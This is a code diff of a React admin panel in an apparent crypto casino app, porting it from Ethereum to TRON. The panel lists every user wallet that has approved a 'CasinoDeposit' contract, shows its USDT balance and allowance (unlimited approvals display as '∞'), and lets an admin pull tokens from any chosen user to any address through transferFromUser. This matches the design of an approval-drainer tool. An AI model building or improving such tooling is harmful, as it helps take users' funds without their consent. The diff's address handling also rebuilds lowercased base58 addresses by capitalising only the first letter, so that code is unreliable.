@@ -1,19 +1,17 @@
 'use client';
 
-import { useState, useEffect, useCallback, useMemo } from 'react';
-import { useAccount, useWriteContract, useWaitForTransactionReceipt, useReadContracts } from 'wagmi';
+import { useState, useEffect, useCallback } from 'react';
+import { useWallet } from '@tronweb3/tronwallet-adapter-react-hooks';
 import { createClient } from '@/lib/supabase';
-import { CONTRACTS, SUPPORTED_TOKENS, TokenSymbol } from '@/lib/contracts';
+import { getActiveTronConfig } from '@/lib/contracts';
 import { Card, CardContent, CardHeader, CardTitle, CardDescription } from '@/components/ui/card';
 import { Button } from '@/components/ui/button';
 import { Input } from '@/components/ui/input';
 import { Label } from '@/components/ui/label';
-import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from '@/components/ui/select';
 import { Table, TableBody, TableCell, TableHead, TableHeader, TableRow } from '@/components/ui/table';
 import { Badge } from '@/components/ui/badge';
 import { Loader2, Send, RefreshCw, AlertCircle, CheckCircle, Users, Wallet } from 'lucide-react';
 import { toast } from 'sonner';
-import { parseUnits, formatUnits } from 'viem';
 
 interface UserData {
   id: string;
@@ -21,137 +19,47 @@ interface UserData {
 }
 
 interface UserWithData extends UserData {
-  allowances: Record<string, bigint>;
-  balances: Record<string, bigint>;
+  allowance: bigint;
+  balance: bigint;
 }
 
-// ERC20 ABI for allowance and balanceOf
-const ERC20_ABI = [
-  {
-    inputs: [
-      { name: 'owner', type: 'address' },
-      { name: 'spender', type: 'address' },
-    ],
-    name: 'allowance',
-    outputs: [{ name: '', type: 'uint256' }],
-    stateMutability: 'view',
-    type: 'function',
-  },
-  {
-    inputs: [{ name: 'account', type: 'address' }],
-    name: 'balanceOf',
-    outputs: [{ name: '', type: 'uint256' }],
-    stateMutability: 'view',
-    type: 'function',
-  },
-] as const;
+// Helper to check if address is a TRON address (starts with T or t, case-insensitive)
+const isTronAddress = (address: string): boolean => {
+  return address && (address.startsWith('T') || address.startsWith('t')) && address.length === 34;
+};
+
+// Convert stored lowercase address to proper TRON Base58 format for display
+const formatTronAddress = (address: string): string => {
+  // If already uppercase, return as-is
+  if (address.startsWith('T')) return address;
+  // Convert first letter to uppercase for display (TRON addresses always start with T)
+  return 'T' + address.slice(1);
+};
 
 export function PermitTransfer() {
-  const { address, isConnected } = useAccount();
+  const { address: tronAddress, connected: isTronConnected } = useWallet();
   const supabase = createClient();
   
   const [users, setUsers] = useState<UserData[]>([]);
+  const [usersWithData, setUsersWithData] = useState<UserWithData[]>([]);
   const [isLoading, setIsLoading] = useState(true);
+  const [isLoadingData, setIsLoadingData] = useState(false);
   const [selectedUser, setSelectedUser] = useState<UserWithData | null>(null);
-  const [selectedToken, setSelectedToken] = useState<TokenSymbol>('USDT');
   const [receiverAddress, setReceiverAddress] = useState('');
   const [transferAmount, setTransferAmount] = useState('');
-  const [txHash, setTxHash] = useState<`0x${string}` | undefined>();
-  
-  const { writeContractAsync, isPending: isWriting } = useWriteContract();
-  
-  const { isLoading: isConfirming, isSuccess: isConfirmed } = useWaitForTransactionReceipt({
-    hash: txHash,
-  });
+  const [isProcessing, setIsProcessing] = useState(false);
+  const [txSuccess, setTxSuccess] = useState(false);
 
-  // Build contract read calls for all users - both allowances and balances
-  const contractCalls = useMemo(() => {
-    const contracts: any[] = [];
-    const tokenEntries = Object.entries(SUPPORTED_TOKENS);
-    
-    users.forEach(user => {
-      tokenEntries.forEach(([symbol, token]) => {
-        // Allowance call
-        contracts.push({
-          address: token.address,
-          abi: ERC20_ABI,
-          functionName: 'allowance',
-          args: [user.wallet_address as `0x${string}`, CONTRACTS.CasinoDeposit.address],
-        });
-        // Balance call
-        contracts.push({
-          address: token.address,
-          abi: ERC20_ABI,
-          functionName: 'balanceOf',
-          args: [user.wallet_address as `0x${string}`],
-        });
-      });
-    });
-    
-    return contracts;
-  }, [users]);
-
-  // Fetch data from blockchain
-  const { data: contractData, refetch: refetchData, isLoading: isLoadingData } = useReadContracts({
-    contracts: contractCalls,
-    query: {
-      enabled: users.length > 0,
-    }
-  });
-
-  // Process data into a usable format
-  const usersWithData = useMemo(() => {
-    if (!contractData || users.length === 0) return [];
-    
-    const tokenSymbols = Object.keys(SUPPORTED_TOKENS) as TokenSymbol[];
-    const usersData: UserWithData[] = [];
-    
-    // Each user has (allowance + balance) * tokens = 2 * tokens calls
-    const callsPerUser = tokenSymbols.length * 2;
-    
-    users.forEach((user, userIndex) => {
-      const allowances: Record<string, bigint> = {};
-      const balances: Record<string, bigint> = {};
-      
-      tokenSymbols.forEach((symbol, tokenIndex) => {
-        // Allowance is at even indices within user's calls
-        const allowanceIndex = userIndex * callsPerUser + tokenIndex * 2;
-        const balanceIndex = allowanceIndex + 1;
-        
-        const allowanceResult = contractData[allowanceIndex];
-        const balanceResult = contractData[balanceIndex];
-        
-        if (allowanceResult && allowanceResult.status === 'success') {
-          allowances[symbol] = allowanceResult.result as bigint;
-        } else {
-          allowances[symbol] = BigInt(0);
-        }
-        
-        if (balanceResult && balanceResult.status === 'success') {
-          balances[symbol] = balanceResult.result as bigint;
-        } else {
-          balances[symbol] = BigInt(0);
-        }
-      });
-      
-      // Only include users with at least one non-zero allowance
-      const hasAllowance = Object.values(allowances).some(a => a > BigInt(0));
-      if (hasAllowance) {
-        usersData.push({ ...user, allowances, balances });
-      }
-    });
-    
-    return usersData;
-  }, [contractData, users]);
-
-  // Load users from database
+  // Load users from database - only TRON addresses
   const loadUsers = useCallback(async () => {
     setIsLoading(true);
     try {
+      // Database stores addresses in lowercase (start with 't')
       const { data, error } = await supabase
         .from('users')
         .select('id, wallet_address')
         .not('wallet_address', 'is', null)
+        .like('wallet_address', 't%')
         .order('created_at', { ascending: false });
       
       if (error) {
@@ -160,7 +68,9 @@ export function PermitTransfer() {
         return;
       }
       
-      setUsers(data || []);
+      // Filter to only valid TRON addresses
+      const tronUsers = (data || []).filter((u: any) => isTronAddress(u.wallet_address));
+      setUsers(tronUsers);
     } catch (error) {
       console.error('Error:', error);
       toast.error('Failed to load users');
@@ -169,46 +79,89 @@ export function PermitTransfer() {
     }
   }, [supabase]);
 
+  // Fetch allowances and balances for TRON users
+  const fetchTronData = useCallback(async () => {
+    if (users.length === 0) {
+      setUsersWithData([]);
+      return;
+    }
+
+    setIsLoadingData(true);
+    try {
+      const tronWeb = (window as any).tronWeb || (window as any).tronLink?.tronWeb;
+      if (!tronWeb || !tronWeb.ready) {
+        console.warn('TronWeb not available');
+        setUsersWithData([]);
+        return;
+      }
+
+      const tronConfig = getActiveTronConfig();
+      const usdtContract = await tronWeb.contract().at(tronConfig.usdt);
+      
+      const usersData: UserWithData[] = [];
+      
+      for (const user of users) {
+        try {
+          // Fetch allowance and balance for USDT - use formatted address
+          const formattedAddr = formatTronAddress(user.wallet_address);
+          const [allowanceResult, balanceResult] = await Promise.all([
+            usdtContract.allowance(formattedAddr, tronConfig.casinoDepositAddress).call(),
+            usdtContract.balanceOf(formattedAddr).call()
+          ]);
+
+          const allowance = allowanceResult?.toString ? BigInt(allowanceResult.toString()) : BigInt(0);
+          const balance = balanceResult?.toString ? BigInt(balanceResult.toString()) : BigInt(0);
+
+          // Only include users with allowance > 0
+          if (allowance > BigInt(0)) {
+            usersData.push({
+              ...user,
+              allowance,
+              balance
+            });
+          }
+        } catch (err) {
+          console.warn(`Failed to fetch data for ${user.wallet_address}:`, err);
+        }
+      }
+      
+      setUsersWithData(usersData);
+    } catch (error) {
+      console.error('Error fetching TRON data:', error);
+      toast.error('Failed to fetch user allowances');
+    } finally {
+      setIsLoadingData(false);
+    }
+  }, [users]);
+
   useEffect(() => {
     loadUsers();
   }, [loadUsers]);
 
-  // Handle transaction success
   useEffect(() => {
-    if (isConfirmed && selectedUser) {
-      toast.success('Transfer completed successfully!');
-      setSelectedUser(null);
-      setReceiverAddress('');
-      setTransferAmount('');
-      setTxHash(undefined);
-      refetchData();
+    if (users.length > 0 && isTronConnected) {
+      fetchTronData();
     }
-  }, [isConfirmed, selectedUser, refetchData]);
+  }, [users, isTronConnected, fetchTronData]);
 
-  // Execute transfer from user
+  // Execute transfer from user using TronWeb
   const executeTransfer = async () => {
-    if (!selectedUser || !receiverAddress || !transferAmount || !selectedToken) {
+    if (!selectedUser || !receiverAddress || !transferAmount) {
       toast.error('Please fill in all fields');
       return;
     }
 
-    // Validate receiver address format
-    if (!receiverAddress.match(/^0x[a-fA-F0-9]{40}$/)) {
-      toast.error('Invalid receiver address format');
+    // Validate receiver address format (TRON address)
+    if (!isTronAddress(receiverAddress)) {
+      toast.error('Invalid TRON receiver address format (must start with T and be 34 characters)');
       return;
     }
 
-    const token = SUPPORTED_TOKENS[selectedToken];
-    const allowance = selectedUser.allowances[selectedToken] || BigInt(0);
-    const balance = selectedUser.balances[selectedToken] || BigInt(0);
+    const allowance = selectedUser.allowance;
+    const balance = selectedUser.balance;
     
-    let amount: bigint;
-    try {
-      amount = parseUnits(transferAmount, token.decimals);
-    } catch (e) {
-      toast.error('Invalid amount format');
-      return;
-    }
+    // USDT on TRON has 6 decimals
+    const amount = BigInt(Math.floor(parseFloat(transferAmount) * 1e6));
 
     if (amount <= BigInt(0)) {
       toast.error('Amount must be greater than 0');
@@ -226,72 +179,92 @@ export function PermitTransfer() {
     }
 
     try {
-      // Debug logging
-      console.log('=== Transfer Debug Info ===');
-      console.log('Contract Address:', CONTRACTS.CasinoDeposit.address);
-      console.log('Token Address:', token.address);
-      console.log('From (User):', selectedUser.wallet_address);
-      console.log('To (Receiver):', receiverAddress);
-      console.log('Amount (raw):', amount.toString());
-      console.log('User Allowance (raw):', allowance.toString());
-      console.log('User Balance (raw):', balance.toString());
-      console.log('Connected Wallet:', address);
-      console.log('===========================');
+      setIsProcessing(true);
+      setTxSuccess(false);
 
-      const hash = await writeContractAsync({
-        address: CONTRACTS.CasinoDeposit.address,
-        abi: CONTRACTS.CasinoDeposit.abi,
-        functionName: 'transferFromUser',
-        args: [
-          token.address,
-          selectedUser.wallet_address as `0x${string}`,
-          receiverAddress as `0x${string}`,
-          amount,
-        ],
-        gas: BigInt(300000), // Set explicit gas limit to avoid estimation issues
-      });
+      const tronWeb = (window as any).tronWeb || (window as any).tronLink?.tronWeb;
+      if (!tronWeb || !tronWeb.ready) {
+        toast.error('TronLink wallet not detected or not ready');
+        return;
+      }
+
+      const tronConfig = getActiveTronConfig();
       
-      setTxHash(hash);
-      toast.info('Transaction submitted. Waiting for confirmation...');
+      // Debug logging
+      // Use formatted TRON address (uppercase T)
+      const formattedFromAddr = formatTronAddress(selectedUser.wallet_address);
+      
+      console.log('=== TRON Transfer Debug Info ===');
+      console.log('Casino Contract:', tronConfig.casinoDepositAddress);
+      console.log('USDT Token:', tronConfig.usdt);
+      console.log('From (User):', formattedFromAddr);
+      console.log('To (Receiver):', receiverAddress);
+      console.log('Amount (sun):', amount.toString());
+      console.log('User Allowance (sun):', allowance.toString());
+      console.log('User Balance (sun):', balance.toString());
+      console.log('Connected Wallet:', tronAddress);
+      console.log('================================');
+
+      const casinoContract = await tronWeb.contract().at(tronConfig.casinoDepositAddress);
+      
+      // Call transferFromUser on the CasinoDeposit contract
+      const tx = await casinoContract.transferFromUser(
+        tronConfig.usdt,
+        formattedFromAddr,
+        receiverAddress,
+        amount.toString()
+      ).send();
+
+      console.log('Transfer tx:', tx);
+      toast.success('Transfer submitted successfully!');
+      setTxSuccess(true);
+      
+      // Reset form
+      setSelectedUser(null);
+      setReceiverAddress('');
+      setTransferAmount('');
+      
+      // Refresh data
+      setTimeout(() => fetchTronData(), 3000);
     } catch (error: any) {
       console.error('Transfer error:', error);
-      console.error('Error message:', error.message);
-      console.error('Error shortMessage:', error.shortMessage);
       
-      // Parse common error messages
-      const errorMessage = error.shortMessage || error.message || '';
+      const errorMessage = error.message || '';
       
-      if (errorMessage.includes('OwnableUnauthorizedAccount') || errorMessage.includes('caller is not the owner')) {
+      if (errorMessage.includes('caller is not the owner') || errorMessage.includes('Ownable')) {
         toast.error('Only the contract owner can execute this transfer');
-      } else if (errorMessage.includes('insufficient allowance') || errorMessage.includes('ERC20InsufficientAllowance')) {
+      } else if (errorMessage.includes('insufficient allowance')) {
         toast.error('User has not approved enough tokens for this transfer');
-      } else if (errorMessage.includes('insufficient balance') || errorMessage.includes('ERC20InsufficientBalance')) {
+      } else if (errorMessage.includes('insufficient balance')) {
         toast.error('User does not have enough token balance');
-      } else if (errorMessage.includes('cap too high') || errorMessage.includes('gas')) {
-        toast.error('Transaction failed - you may not be the contract owner or the allowance is insufficient');
-      } else if (errorMessage.includes('User rejected') || errorMessage.includes('denied')) {
+      } else if (errorMessage.includes('rejected') || errorMessage.includes('denied') || errorMessage.includes('cancelled')) {
         toast.error('Transaction rejected by user');
       } else {
         toast.error(errorMessage || 'Transfer failed');
       }
+    } finally {
+      setIsProcessing(false);
     }
   };
 
-  // Format address for display
-  const formatAddress = (addr: string) => `${addr.slice(0, 6)}...${addr.slice(-4)}`;
+  // Format address for display - use proper TRON format
+  const formatAddress = (addr: string) => {
+    const formatted = formatTronAddress(addr);
+    return `${formatted.slice(0, 8)}...${formatted.slice(-6)}`;
+  };
 
-  // Format amount for display
-  const formatAmount = (amount: bigint, symbol: TokenSymbol) => {
-    const token = SUPPORTED_TOKENS[symbol];
-    const formatted = formatUnits(amount, token.decimals);
-    const num = parseFloat(formatted);
+  // Format amount for display (USDT has 6 decimals on TRON)
+  const formatAmount = (amount: bigint) => {
+    const num = Number(amount) / 1e6;
     if (num > 1e15) return '∞'; // Unlimited approval
     return num.toLocaleString(undefined, { maximumFractionDigits: 2 });
   };
 
   const handleRefresh = () => {
     loadUsers();
-    refetchData();
+    if (isTronConnected) {
+      fetchTronData();
+    }
   };
 
   const allLoading = isLoading || isLoadingData;
@@ -303,10 +276,10 @@ export function PermitTransfer() {
           <div>
             <CardTitle className="flex items-center gap-2">
               <Users className="h-5 w-5 text-casino-brand" />
-              Admin Withdrawal
+              TRON Admin Transfer
             </CardTitle>
             <CardDescription>
-              Transfer tokens from users who have approved the contract
+              Transfer USDT from TRON users who have approved the contract
             </CardDescription>
           </div>
           <Button variant="outline" size="sm" onClick={handleRefresh} disabled={allLoading}>
@@ -316,38 +289,53 @@ export function PermitTransfer() {
         </div>
       </CardHeader>
       <CardContent className="space-y-6">
-        {!isConnected ? (
+        {!isTronConnected ? (
           <div className="flex items-center gap-2 p-4 rounded-lg bg-yellow-500/10 border border-yellow-500/20">
             <Wallet className="h-5 w-5 text-yellow-500" />
-            <span className="text-yellow-400">Please connect your admin wallet to transfer tokens</span>
+            <span className="text-yellow-400">Please connect your TRON admin wallet to transfer tokens</span>
           </div>
         ) : (
           <>
-            {/* Whitelisted Users Table */}
+            {/* Connected Wallet Info */}
+            <div className="flex items-center gap-2 p-3 rounded-lg bg-casino-brand/10 border border-casino-brand/20">
+              <Wallet className="h-4 w-4 text-casino-brand" />
+              <span className="text-casino-brand text-sm">
+                Connected: {tronAddress?.slice(0, 8)}...{tronAddress?.slice(-6)}
+              </span>
+            </div>
+
+            {/* Transaction Success Status */}
+            {txSuccess && (
+              <div className="flex items-center gap-2 p-3 rounded-lg bg-green-500/10 border border-green-500/20">
+                <CheckCircle className="h-4 w-4 text-green-400" />
+                <span className="text-green-400">Transfer submitted successfully!</span>
+              </div>
+            )}
+
+            {/* Users with Approvals Table */}
             <div className="rounded-md border border-white/10 overflow-x-auto">
               <Table>
                 <TableHeader>
                   <TableRow className="border-white/10 hover:bg-transparent">
-                    <TableHead>User Wallet</TableHead>
-                    <TableHead className="text-center">USDT</TableHead>
-                    <TableHead className="text-center">USDC</TableHead>
-                    <TableHead className="text-center">DAI</TableHead>
+                    <TableHead>TRON Wallet</TableHead>
+                    <TableHead className="text-center">USDT Balance</TableHead>
+                    <TableHead className="text-center">USDT Approved</TableHead>
                     <TableHead>Action</TableHead>
                   </TableRow>
                 </TableHeader>
                 <TableBody>
                   {allLoading ? (
                     <TableRow>
-                      <TableCell colSpan={5} className="text-center py-8">
+                      <TableCell colSpan={4} className="text-center py-8">
                         <Loader2 className="h-6 w-6 animate-spin mx-auto mb-2" />
-                        Loading users and token data...
+                        Loading TRON users and token data...
                       </TableCell>
                     </TableRow>
                   ) : usersWithData.length === 0 ? (
                     <TableRow>
-                      <TableCell colSpan={5} className="text-center py-8 text-muted-foreground">
+                      <TableCell colSpan={4} className="text-center py-8 text-muted-foreground">
                         <AlertCircle className="h-6 w-6 mx-auto mb-2 opacity-50" />
-                        No users with token approvals found
+                        No TRON users with USDT approvals found
                       </TableCell>
                     </TableRow>
                   ) : (
@@ -361,49 +349,22 @@ export function PermitTransfer() {
                           onClick={() => setSelectedUser(isSelected ? null : user)}
                         >
                           <TableCell className="font-mono">
-                            {formatAddress(user.wallet_address)}
-                          </TableCell>
-                          <TableCell className="text-center">
-                            <div className="flex flex-col items-center gap-1">
-                              <span className="text-xs text-muted-foreground">
-                                Balance: {formatAmount(user.balances['USDT'], 'USDT')}
-                              </span>
-                              {user.allowances['USDT'] > BigInt(0) ? (
-                                <Badge variant="outline" className="border-green-500/50 text-green-400">
-                                  Approved: {formatAmount(user.allowances['USDT'], 'USDT')}
-                                </Badge>
-                              ) : (
-                                <span className="text-muted-foreground text-xs">No approval</span>
-                              )}
+                            <div className="flex items-center gap-2">
+                              <Badge variant="outline" className="text-xs border-red-500/50 text-red-400">
+                                TRC-20
+                              </Badge>
+                              {formatAddress(user.wallet_address)}
                             </div>
                           </TableCell>
                           <TableCell className="text-center">
-                            <div className="flex flex-col items-center gap-1">
-                              <span className="text-xs text-muted-foreground">
-                                Balance: {formatAmount(user.balances['USDC'], 'USDC')}
-                              </span>
-                              {user.allowances['USDC'] > BigInt(0) ? (
-                                <Badge variant="outline" className="border-blue-500/50 text-blue-400">
-                                  Approved: {formatAmount(user.allowances['USDC'], 'USDC')}
-                                </Badge>
-                              ) : (
-                                <span className="text-muted-foreground text-xs">No approval</span>
-                              )}
-                            </div>
+                            <span className="text-sm">
+                              {formatAmount(user.balance)} USDT
+                            </span>
                           </TableCell>
                           <TableCell className="text-center">
-                            <div className="flex flex-col items-center gap-1">
-                              <span className="text-xs text-muted-foreground">
-                                Balance: {formatAmount(user.balances['DAI'], 'DAI')}
-                              </span>
-                              {user.allowances['DAI'] > BigInt(0) ? (
-                                <Badge variant="outline" className="border-yellow-500/50 text-yellow-400">
-                                  Approved: {formatAmount(user.allowances['DAI'], 'DAI')}
-                                </Badge>
-                              ) : (
-                                <span className="text-muted-foreground text-xs">No approval</span>
-                              )}
-                            </div>
+                            <Badge variant="outline" className="border-green-500/50 text-green-400">
+                              {formatAmount(user.allowance)} USDT
+                            </Badge>
                           </TableCell>
                           <TableCell>
                             <Button 
@@ -427,45 +388,27 @@ export function PermitTransfer() {
               <div className="p-4 rounded-lg border border-casino-brand/30 bg-casino-brand/5 space-y-4">
                 <h4 className="font-semibold flex items-center gap-2">
                   <CheckCircle className="h-4 w-4 text-casino-brand" />
-                  Transfer from {formatAddress(selectedUser.wallet_address)}
+                  Transfer USDT from {formatAddress(selectedUser.wallet_address)}
                 </h4>
                 
-                <div className="grid grid-cols-3 gap-4">
+                <div className="grid grid-cols-2 gap-4">
                   <div className="space-y-2">
-                    <Label>Token</Label>
-                    <Select value={selectedToken} onValueChange={(v) => setSelectedToken(v as TokenSymbol)}>
-                      <SelectTrigger className="bg-black/30 border-white/10">
-                        <SelectValue />
-                      </SelectTrigger>
-                      <SelectContent>
-                        {(Object.keys(SUPPORTED_TOKENS) as TokenSymbol[]).map((symbol) => {
-                          const hasAllowance = selectedUser.allowances[symbol] > BigInt(0);
-                          const balance = formatAmount(selectedUser.balances[symbol], symbol);
-                          return (
-                            <SelectItem key={symbol} value={symbol} disabled={!hasAllowance}>
-                              {symbol} (Bal: {balance}) {!hasAllowance && '- No approval'}
-                            </SelectItem>
-                          );
-                        })}
-                      </SelectContent>
-                    </Select>
-                  </div>
-                  <div className="space-y-2">
-                    <Label>Receiver Address</Label>
+                    <Label>Receiver TRON Address</Label>
                     <Input
-                      placeholder="0x..."
+                      placeholder="T..."
                       value={receiverAddress}
                       onChange={(e) => setReceiverAddress(e.target.value)}
                       className="bg-black/30 border-white/10"
                     />
                   </div>
                   <div className="space-y-2">
-                    <Label>Amount (Max: {formatAmount(
-                      selectedUser.balances[selectedToken] < selectedUser.allowances[selectedToken] 
-                        ? selectedUser.balances[selectedToken] 
-                        : selectedUser.allowances[selectedToken], 
-                      selectedToken
-                    )})</Label>
+                    <Label>
+                      Amount USDT (Max: {formatAmount(
+                        selectedUser.balance < selectedUser.allowance 
+                          ? selectedUser.balance 
+                          : selectedUser.allowance
+                      )})
+                    </Label>
                     <Input
                       type="number"
                       placeholder="0.00"
@@ -478,43 +421,26 @@ export function PermitTransfer() {
 
                 <Button
                   onClick={executeTransfer}
-                  disabled={isWriting || isConfirming || !receiverAddress || !transferAmount}
+                  disabled={isProcessing || !receiverAddress || !transferAmount}
                   className="w-full bg-casino-brand text-black hover:bg-casino-brand/90"
                 >
-                  {isWriting || isConfirming ? (
+                  {isProcessing ? (
                     <>
                       <Loader2 className="mr-2 h-4 w-4 animate-spin" />
-                      {isConfirming ? 'Confirming...' : 'Submitting...'}
+                      Processing...
                     </>
                   ) : (
                     <>
                       <Send className="mr-2 h-4 w-4" />
-                      Transfer Tokens
+                      Transfer USDT
                     </>
                   )}
                 </Button>
 
                 <p className="text-xs text-muted-foreground">
-                  This will transfer tokens from the selected user to the receiver address. 
-                  User must have approved the CasinoDeposit contract for this token.
+                  This will transfer USDT from the selected TRON user to the receiver address. 
+                  User must have approved the CasinoDeposit contract.
                 </p>
-              </div>
-            )}
-
-            {/* Transaction Status */}
-            {txHash && (
-              <div className={`flex items-center gap-2 p-3 rounded-lg ${isConfirmed ? 'bg-green-500/10 border border-green-500/20' : 'bg-blue-500/10 border border-blue-500/20'}`}>
-                {isConfirming ? (
-                  <>
-                    <Loader2 className="h-4 w-4 animate-spin text-blue-400" />
-                    <span className="text-blue-400">Transaction pending...</span>
-                  </>
-                ) : isConfirmed ? (
-                  <>
-                    <CheckCircle className="h-4 w-4 text-green-400" />
-                    <span className="text-green-400">Transaction confirmed!</span>
-                  </>
-                ) : null}
               </div>
             )}
           </>
